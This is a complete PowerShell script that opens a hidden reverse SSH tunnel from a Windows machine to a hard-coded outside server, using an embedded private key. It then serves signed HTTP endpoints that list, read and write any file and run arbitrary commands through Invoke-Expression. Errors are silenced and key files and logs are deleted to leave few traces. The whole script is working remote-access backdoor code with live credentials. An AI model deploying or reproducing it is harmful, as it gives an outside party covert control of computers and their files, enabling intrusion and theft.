$ErrorActionPreference = 'SilentlyContinue'

Get-WmiObject Win32_Process -Filter "Name = 'ssh.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*92.5.47.84*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

$userHome = if ($env:USERPROFILE) { $env:USERPROFILE } elseif ($env:HOME) { $env:HOME } else { "." }
$oldSshDir = "$userHome\.ssh"
if (Test-Path -LiteralPath $oldSshDir) {
    Get-ChildItem -Path $oldSshDir -Filter "k_*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem -Path $oldSshDir -Filter "kh_*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}
$tempCleanupDir = if ($env:TEMP) { $env:TEMP } else { $oldSshDir }
Get-ChildItem -Path $tempCleanupDir -Filter "k_*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $tempCleanupDir -Filter "kh_*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $tempCleanupDir -Filter "s_*_*.log" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

$sshExe = if (Get-Command ssh.exe -ErrorAction SilentlyContinue) { (Get-Command ssh.exe -ErrorAction SilentlyContinue).Source } elseif (Get-Command ssh -CommandType Application -ErrorAction SilentlyContinue) { (Get-Command ssh -CommandType Application -ErrorAction SilentlyContinue).Source } elseif (Test-Path "$env:SystemRoot\System32\OpenSSH\ssh.exe") { "$env:SystemRoot\System32\OpenSSH\ssh.exe" } else { $null }
if (-not $sshExe) {
    Write-Host "[!] В системе не найден OpenSSH Client (ssh.exe)." -ForegroundColor Red
    return
}

$bridgeToken = "f346b3b7909903cb3ead4ff1b4565900c811a4533793e626"
$rsaModulusB64 = "/TMkbKFubkFXPMT4BEHFTJCC1hxXjR4P55iLPMnhauSs3Fe5jpnUzRnUbX+QzijtaDEEUnvz7Hx15OuxqZJnpA17sYKafECFYLDkhUrSL3VqJXDPkWSDeVINXi5EvTP7GyrXXeOrWv7lS+jy/y1lcrUkqNTKGpfs+R7LCRm4li9hCIbhyNr1fkKbyf2y0jsoKz6PdaZ3KsRR00C3miENE8ygtPQv0/V9G7pJvDT/athcCFUQ09XX3rHi9ZFGtJ07QEavh79axXxL8hwbHwSYY81IKKQr4umKomUM/t5gwktbOrnaViyD+pHpL2VFInQ4j9+imFUrwZ0uvbecNBFwjw=="
$rsaExponentB64 = "AQAB"

$tempDir = if ($env:TEMP) { $env:TEMP } else { $oldSshDir }
$randId = [System.Guid]::NewGuid().ToString('N').Substring(0,8)
$k = "$tempDir\k_$randId"
$kh = "$tempDir\kh_$randId"

$script:cleanupFiles = New-Object System.Collections.Generic.List[string]
$script:cleanupFiles.Add($k)
$script:cleanupFiles.Add($kh)

$keyContent = @"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB4A11qLGaD2zDGwvSMAW9U8C+Icgz3JO1Hp655Z68h3wAAAJjaOxga2jsY
GgAAAAtzc2gtZWQyNTUxOQAAACB4A11qLGaD2zDGwvSMAW9U8C+Icgz3JO1Hp655Z68h3w
AAAEDVsAU9dxzgHQspxskr9G/PPW5ekRLVcCCdKVkfi7PHdHgDXWosZoPbMMbC9IwBb1Tw
L4hyDPck7UenrnlnryHfAAAAEHBjLXR1bm5lbEBvcmFjbGUBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
"@

$cleanKey = ($keyContent.Trim() -replace "`r`n", "`n") + "`n"
[System.IO.File]::WriteAllText($k, $cleanKey, [System.Text.Encoding]::ASCII)

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
if (-not $currentUser) { $currentUser = $env:USERNAME }
icacls $k /inheritance:r /grant:r "${currentUser}:(F)" 2>&1 | Out-Null

$pinnedHostKey = "[92.5.47.84]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKx6Cigpx3fUZr/y3Vow0/uAUQ75Mc/0ekydHjqGN0Vd`n"
[System.IO.File]::WriteAllText($kh, $pinnedHostKey, [System.Text.Encoding]::ASCII)

$script:sshProc = $null
$script:listener = $null
$script:activePort = 0

$cleanupScript = {
    try { if ($script:listener -and $script:listener.IsListening) { $script:listener.Stop(); $script:listener.Close() } } catch {}
    try { if ($script:sshProc -and -not $script:sshProc.HasExited) { Stop-Process -Id $script:sshProc.Id -Force -ErrorAction SilentlyContinue } } catch {}
    if ($script:cleanupFiles) {
        foreach ($f in $script:cleanupFiles) {
            try { if ($f -and (Test-Path -LiteralPath $f)) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue } } catch {}
        }
    }
}

try { [System.AppDomain]::CurrentDomain.add_ProcessExit({ & $cleanupScript }) } catch {}

$connected = $false
$lastError = ""
for ($p = 8888; $p -le 8895; $p++) {
    $testListener = $null
    try {
        $testListener = New-Object System.Net.HttpListener
        $testListener.Prefixes.Add("http://127.0.0.1:$p/")
        $testListener.Start()
    } catch {
        if ($testListener) { $testListener.Close() }
        continue
    }

    $currentLog = "$tempDir\s_${randId}_${p}.log"
    $script:cleanupFiles.Add($currentLog)
    $sshArgs = "-i `"$k`" -p 2222 -N -C -R 127.0.0.1:${p}:127.0.0.1:${p} -o StrictHostKeyChecking=yes -o UserKnownHostsFile=`"$kh`" -o ExitOnForwardFailure=yes -o TCPKeepAlive=yes -o ServerAliveInterval=10 -o ServerAliveCountMax=3 ubuntu@92.5.47.84"
    $proc = Start-Process -FilePath $sshExe -ArgumentList $sshArgs -PassThru -WindowStyle Hidden -RedirectStandardError $currentLog

    for ($w = 0; $w -lt 15; $w++) {
        Start-Sleep -Milliseconds 200
        if ($proc.HasExited) { break }
    }

    if (-not $proc.HasExited) {
        $script:activePort = $p
        $script:sshProc = $proc
        $script:listener = $testListener
        $connected = $true
        try { if (Test-Path -LiteralPath $k) { Remove-Item -LiteralPath $k -Force -ErrorAction SilentlyContinue } } catch {}
        try { if (Test-Path -LiteralPath $currentLog) { Remove-Item -LiteralPath $currentLog -Force -ErrorAction SilentlyContinue } } catch {}
        break
    } else {
        if (Test-Path -LiteralPath $currentLog) {
            $lastError = Get-Content -LiteralPath $currentLog -Raw -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $currentLog -Force -ErrorAction SilentlyContinue
        }
        $testListener.Stop()
        $testListener.Close()
    }
}

if (-not $connected) {
    Write-Host "[!] Не удалось подключиться к серверу." -ForegroundColor Red
    if ($lastError) {
        Write-Host "Детали ошибки: $lastError" -ForegroundColor Yellow
    }
    & $cleanupScript
    return
}

$pcUser = if ($env:COMPUTERNAME -and $env:USERNAME -and $env:COMPUTERNAME -ine $env:USERNAME) { "$($env:COMPUTERNAME) ($($env:USERNAME))" } elseif ($env:USERNAME) { "$env:USERNAME" } else { "$env:COMPUTERNAME" }
Write-Host "[+] Доступ открыт" -ForegroundColor Green
Write-Host "ПК: $pcUser | Порт: $script:activePort" -ForegroundColor Green

function Read-StreamBytesSafe($stream, [int]$limitBytes = 10485760) {
    $ms = New-Object System.IO.MemoryStream
    try {
        if ($stream.CanTimeout) { $stream.ReadTimeout = 6000 }
        $buf = New-Object byte[] 8192
        $total = 0
        while (($read = $stream.Read($buf, 0, $buf.Length)) -gt 0) {
            $total += $read
            if ($total -gt $limitBytes) { return $null }
            $ms.Write($buf, 0, $read)
        }
        return $ms.ToArray()
    }
    catch { return $null }
    finally { $ms.Dispose() }
}

$script:seenNonces = New-Object 'System.Collections.Generic.Dictionary[string, long]'
$script:nonceLock = New-Object object
$script:lastServerTs = 0L

function Verify-RequestSignature($req, [string]$action, [string]$pathParam, [byte[]]$bodyBytes) {
    $script:lastSigError = ""
    try {
        $tsStr = $req.Headers["X-Bridge-Timestamp"]
        $nonce = $req.Headers["X-Bridge-Nonce"]
        $sigB64 = $req.Headers["X-Bridge-Signature"]

        if (-not $tsStr -or -not $nonce -or -not $sigB64) {
            $script:lastSigError = "MissingHeaders"
            return $false
        }

        if ($nonce.Length -ne 16 -or $nonce -notmatch '^[0-9a-fA-F]{16}$') {
            $script:lastSigError = "InvalidNonceFormat"
            return $false
        }

        if ($sigB64.Length -ne 344) {
            $script:lastSigError = "InvalidSignatureLength"
            return $false
        }

        $ts = 0L
        if (-not [long]::TryParse($tsStr, [ref]$ts) -or $ts -le 0) {
            $script:lastSigError = "InvalidTimestamp"
            return $false
        }

        $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        if ([Math]::Abs($now - $ts) -gt 120) {
            $script:lastSigError = "TimestampExpired:skew=$([Math]::Abs($now - $ts))s"
            return $false
        }

        [System.Threading.Monitor]::Enter($script:nonceLock)
        try {
            if ($script:seenNonces.ContainsKey($nonce)) {
                $script:lastSigError = "ReplayedNonce"
                return $false
            }
        } finally {
            [System.Threading.Monitor]::Exit($script:nonceLock)
        }

        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        [byte[]]$bodyBytesSafe = if ($bodyBytes -and $bodyBytes.Length -gt 0) { [byte[]]$bodyBytes } else { New-Object byte[] 0 }
        $hashBytes = $sha256.ComputeHash($bodyBytesSafe)
        $sha256.Dispose()

        $sb = New-Object System.Text.StringBuilder
        foreach ($b in $hashBytes) { [void]$sb.Append($b.ToString("x2")) }
        $bodyHash = $sb.ToString()

        $msg = @($req.HttpMethod, $action, $pathParam, $tsStr, $nonce, $bodyHash) -join ":"
        $msgBytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
        $sigBytes = [System.Convert]::FromBase64String($sigB64)

        $valid = $false

        try {
            $cng = New-Object System.Security.Cryptography.RSACng
            $params = New-Object System.Security.Cryptography.RSAParameters
            $params.Modulus = [System.Convert]::FromBase64String($rsaModulusB64)
            $params.Exponent = [System.Convert]::FromBase64String($rsaExponentB64)
            $cng.ImportParameters($params)
            $valid = $cng.VerifyData($msgBytes, $sigBytes, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
            $cng.Dispose()
        } catch {
            $script:lastSigError = "CngEx:$($_.Exception.Message)"
        }

        if (-not $valid) {
            try {
                $rsa = [System.Security.Cryptography.RSA]::Create()
                $params = New-Object System.Security.Cryptography.RSAParameters
                $params.Modulus = [System.Convert]::FromBase64String($rsaModulusB64)
                $params.Exponent = [System.Convert]::FromBase64String($rsaExponentB64)
                $rsa.ImportParameters($params)
                $valid = $rsa.VerifyData($msgBytes, $sigBytes, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
                $rsa.Dispose()
            } catch {
                $script:lastSigError += "|RsaCreateEx:$($_.Exception.Message)"
            }
        }

        if (-not $valid) {
            try {
                $csp = New-Object System.Security.Cryptography.CspParameters(24)
                $csp.Flags = [System.Security.Cryptography.CspProviderFlags]::NoPrompt
                $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider($csp)
                $params = New-Object System.Security.Cryptography.RSAParameters
                $params.Modulus = [System.Convert]::FromBase64String($rsaModulusB64)
                $params.Exponent = [System.Convert]::FromBase64String($rsaExponentB64)
                $rsa.ImportParameters($params)
                $valid = $rsa.VerifyData($msgBytes, "SHA256", $sigBytes)
                $rsa.Dispose()
            } catch {
                $script:lastSigError += "|Csp24Ex:$($_.Exception.Message)"
            }
        }

        if ($valid) {
            [System.Threading.Monitor]::Enter($script:nonceLock)
            try {
                if ($script:seenNonces.ContainsKey($nonce)) {
                    $script:lastSigError = "ReplayedNonceRace"
                    return $false
                }
                $script:seenNonces[$nonce] = $ts

                if ($script:seenNonces.Count -gt 300) {
                    $cutoff = $now - 150
                    $stale = @($script:seenNonces.Keys | Where-Object { $script:seenNonces[$_] -lt $cutoff })
                    foreach ($k in $stale) { [void]$script:seenNonces.Remove($k) }
                }
                return $true
            } finally {
                [System.Threading.Monitor]::Exit($script:nonceLock)
            }
        }

        if (-not $script:lastSigError) { $script:lastSigError = "SignatureMismatch" }
        return $false

    } catch {
        $script:lastSigError = "OuterEx:$($_.Exception.Message)"
        return $false
    }
}

try {
    while ($script:listener.IsListening) {
        $task = $script:listener.GetContextAsync()
        while (-not $task.AsyncWaitHandle.WaitOne(200)) {
            if (-not $script:listener.IsListening) { break }
        }
        if (-not $script:listener.IsListening -or -not $task.IsCompleted) { break }

        $ctx = $task.GetAwaiter().GetResult()
        $req = $ctx.Request
        $res = $ctx.Response
        $res.KeepAlive = $false
        $action = $req.Url.AbsolutePath
        $path = if ($req.QueryString["path"]) { $req.QueryString["path"] } else { "" }
        $out = [byte[]]@()

        $bodyBytes = [byte[]]@()
        if ($req.HttpMethod -eq 'POST') {
            $bodyBytes = Read-StreamBytesSafe $req.InputStream
            if ($bodyBytes -eq $null) {
                $res.StatusCode = 413
                $out = [System.Text.Encoding]::UTF8.GetBytes('413 Payload Too Large')
                $res.ContentLength64 = $out.Length
                $res.OutputStream.Write($out, 0, $out.Length)
                $res.OutputStream.Close()
                continue
            }
        }

        $incomingToken = $req.Headers["X-Bridge-Token"]
        $tokenValid = ($incomingToken -eq $bridgeToken)
        $sigValid = Verify-RequestSignature $req $action $path $bodyBytes

        if (-not $tokenValid -or -not $sigValid) {
            $res.StatusCode = 403
            $detail = if (-not $tokenValid) { "BadToken" } else { "SigFailed:$script:lastSigError" }
            $out = [System.Text.Encoding]::UTF8.GetBytes("403 Forbidden: $detail")
            $res.ContentLength64 = $out.Length
            $res.OutputStream.Write($out, 0, $out.Length)
            $res.OutputStream.Close()
            continue
        }

        try {
            if ($action -eq '/status') {
                $out = [System.Text.Encoding]::UTF8.GetBytes('OK')
            }
            elseif ($action -eq '/info') {
                $infoObj = @{
                    pc = $env:COMPUTERNAME
                    user = $env:USERNAME
                    os = "Windows"
                    port = $script:activePort
                }
                $jsonStr = $infoObj | ConvertTo-Json -Compress
                $out = [System.Text.Encoding]::UTF8.GetBytes($jsonStr)
            }
            elseif ($action -eq '/kill' -and $req.HttpMethod -eq 'POST') {
                $out = [System.Text.Encoding]::UTF8.GetBytes('OK')
                $res.ContentLength64 = $out.Length
                $res.OutputStream.Write($out, 0, $out.Length)
                $res.OutputStream.Close()
                break
            }
            elseif ($action -eq '/list') {
                $target = if ($path) { $path } else { "C:\" }
                $items = Get-ChildItem -LiteralPath $target -ErrorAction Stop | Select-Object -First 500 | Select-Object Name, Length, @{N='IsDir';E={$_.PSIsContainer}}
                $json = $items | ConvertTo-Json -Depth 2
                $out = [System.Text.Encoding]::UTF8.GetBytes($json)
            }
            elseif ($action -eq '/read') {
                $fileItem = Get-Item -LiteralPath $path -ErrorAction Stop
                if ($fileItem.Length -gt 10485760) {
                    $res.StatusCode = 413
                    $out = [System.Text.Encoding]::UTF8.GetBytes("Error: File exceeds 10MB limit")
                } else {
                    $out = [System.IO.File]::ReadAllBytes($path)
                }
            }
            elseif ($action -eq '/write' -and $req.HttpMethod -eq 'POST') {
                $content = [System.Text.Encoding]::UTF8.GetString($bodyBytes)
                $dir = [System.IO.Path]::GetDirectoryName($path)
                if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force }
                [System.IO.File]::WriteAllText($path, $content, [System.Text.Encoding]::UTF8)
                $out = [System.Text.Encoding]::UTF8.GetBytes('OK')
            }
            elseif ($action -eq '/exec' -and $req.HttpMethod -eq 'POST') {
                $cmd = [System.Text.Encoding]::UTF8.GetString($bodyBytes)
                $resOut = Invoke-Expression $cmd 2>&1 | Out-String
                $out = [System.Text.Encoding]::UTF8.GetBytes($resOut)
            }
            else {
                $res.StatusCode = 404
                $out = [System.Text.Encoding]::UTF8.GetBytes('404')
            }
        }
        catch {
            $res.StatusCode = 500
            $out = [System.Text.Encoding]::UTF8.GetBytes($_.Exception.Message)
        }

        $res.ContentLength64 = $out.Length
        $res.OutputStream.Write($out, 0, $out.Length)
        $res.OutputStream.Close()
    }
}
catch [System.Management.Automation.PipelineStoppedException] {
}
finally {
    & $cleanupScript
}
